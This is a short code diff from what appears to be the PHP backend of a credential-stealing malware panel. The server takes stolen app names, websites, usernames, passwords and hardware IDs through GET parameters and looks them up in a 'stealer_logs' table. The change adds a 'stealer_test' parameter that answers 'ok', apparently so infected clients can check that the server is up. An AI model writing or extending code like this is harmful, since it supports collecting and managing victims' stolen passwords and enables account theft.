@@ -3,6 +3,8 @@
 
 if (isset($_GET['stealer_app']) && isset($_GET['stealer_website']) && isset($_GET['stealer_user']) && isset($_GET['stealer_pass']))
 {
+	if (isset($_GET['stealer_test']))
+		die('ok');
 	$stmt = db_query("SELECT `id` FROM `stealer_logs` WHERE `hwid` = :1 AND `website` = :2 AND `user` = :3 AND `pass` = :4",
 						htmlentities($_GET['hwid']),
 						htmlentities($_GET['stealer_website']),
